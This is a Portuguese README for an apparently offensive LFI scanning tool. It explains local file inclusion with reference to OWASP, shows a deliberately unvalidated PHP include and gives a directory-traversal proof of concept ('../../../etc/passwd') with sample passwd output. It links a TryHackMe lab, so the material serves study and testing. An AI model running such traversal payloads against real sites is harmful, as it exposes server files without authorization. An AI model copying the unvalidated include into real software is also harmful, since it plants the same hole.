# Uso da ferramenta

main.py --url site/teste.php?page= --tempo 2

URL: URL do site alvo.

Tempo: tempo de espera para cada request.

## LFI [¹]

A vulnerabilidade de inclusão de arquivo permite que o invasor inclua um arquivo, geralmente explorando um mecanismo de “inclusão dinâmica de arquivos” implementado no arquivo de destino. Isso ocorre devido à falta de validação de entrada adequada, caracteres de travessia de diretório “../” sendo injetados, podendo causar a leitura do conteúdo de algum arquivo. Sensível. Também pode levar a:

 - Execução de código no servidor web;
 - Execução de código no lado do cliente, como JavaScript, que pode levar a ataques como XSS;
 - Negação de serviço (DOS);
 - Divulgação de informações sensiveis.

### Exemplo de código sem validação: [¹]

```php
<?php
   include($_GET['page']);
?>
```

## Testando vulnerabilidade [¹]

Devemos considerar buscar scripts que considerem nomes de arquivos como parâmetros, como no exemplo abaixo:

``https://site/preview.php?page=example.php``

A prova de conceito (POC) típica seria carregar o arquivo: /etc/passwd

`https://site/preview.php?page=../../../etc/passwd`

Com o resultado de:

```
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
alex:x:500:500:alex:/home/alex:/bin/bash
margo:x:501:501::/home/margo:/bin/bash
```

## Laboratório para teste
https://tryhackme.com/room/lofi

[¹]:https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
